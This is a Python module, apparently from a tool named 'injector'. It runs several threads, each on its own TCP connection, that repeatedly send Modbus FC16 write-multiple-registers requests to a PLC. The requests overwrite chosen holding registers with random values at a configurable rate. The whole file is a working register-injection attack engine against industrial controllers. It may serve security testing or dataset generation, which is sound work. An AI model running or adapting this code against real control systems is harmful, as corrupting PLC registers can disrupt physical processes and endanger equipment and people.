import logging
import random
import threading
import time
from dataclasses import dataclass
from typing import Iterable, List, Sequence, Optional

from injector.core.config import PlcConfig, get_plc_config
from injector.core.modbus import modbus_client

log = logging.getLogger(__name__)


@dataclass(frozen=True)
class Fc16Plan:
    start_addr: int
    count: int


def _chunk_registers(registers: Sequence[int], chunk_size: int) -> List[Fc16Plan]:
    regs = sorted(set(int(r) for r in registers))
    plans: List[Fc16Plan] = []
    i = 0
    while i < len(regs):
        start = regs[i]
        count = 1
        while (i + count) < len(regs) and count < chunk_size and regs[i + count] == start + count:
            count += 1
        plans.append(Fc16Plan(start_addr=start, count=count))
        i += count
    return plans


def write_fc16_once(
    *,
    client,
    cfg: PlcConfig,
    plan: Fc16Plan,
    min_value: int,
    max_value: int,
) -> None:
    values = [random.randint(min_value, max_value) for _ in range(plan.count)]
    rq = client.write_registers(plan.start_addr, values, unit=cfg.unit_id)  # FC16
    if rq.isError():
        raise RuntimeError(f"FC16 error at HR[{plan.start_addr}] x{plan.count}: {rq}")
    log.debug("FC16 wrote HR[%d..%d] (%d regs)", plan.start_addr, plan.start_addr + plan.count - 1, plan.count)


def worker_fc16_overwrite(
    *,
    cfg: PlcConfig,
    stop_event: threading.Event,
    plans: Sequence[Fc16Plan],
    qps: float,
    min_value: int,
    max_value: int,
) -> None:
    period = 1.0 / qps if qps > 0 else 0.0

    with modbus_client(cfg) as client:
        while not stop_event.is_set():
            t0 = time.perf_counter()
            plan = random.choice(plans)
            try:
                write_fc16_once(client=client, cfg=cfg, plan=plan, min_value=min_value, max_value=max_value)
            except Exception as e:
                log.warning("FC16 worker exception: %r", e)

            if period > 0:
                sleep_s = max(0.0, period - (time.perf_counter() - t0))
                stop_event.wait(timeout=sleep_s)


def run_parallel_fc16_overwrite(
    *,
    cfg: Optional[PlcConfig] = None,
    stop_event: Optional[threading.Event] = None,
    target_registers: Sequence[int],
    chunk_size: int = 10,
    workers: int = 3,
    qps_per_worker: float = 5.0,
    min_value: int = 0,
    max_value: int = 1000,
) -> None:
    """
    Lower-level engine: many workers, each has its own TCP connection,
    each emits FC16 writes over chunks of contiguous registers.
    """
    cfg = cfg or get_plc_config()
    stop_event = stop_event or threading.Event()

    plans = _chunk_registers(target_registers, chunk_size=chunk_size)
    if not plans:
        log.warning("FC16 overwrite: empty targets.")
        return

    log.info(
        "FC16 overwrite engine: plans=%d, workers=%d, chunk_size=%d, qps/worker=%.2f",
        len(plans), workers, chunk_size, qps_per_worker
    )

    threads: List[threading.Thread] = []
    for i in range(max(1, workers)):
        t = threading.Thread(
            name=f"FC16W{i+1}",
            target=worker_fc16_overwrite,
            kwargs=dict(
                cfg=cfg,
                stop_event=stop_event,
                plans=plans,
                qps=qps_per_worker,
                min_value=min_value,
                max_value=max_value,
            ),
            daemon=True,
        )
        t.start()
        threads.append(t)

    while not stop_event.is_set():
        time.sleep(0.25)
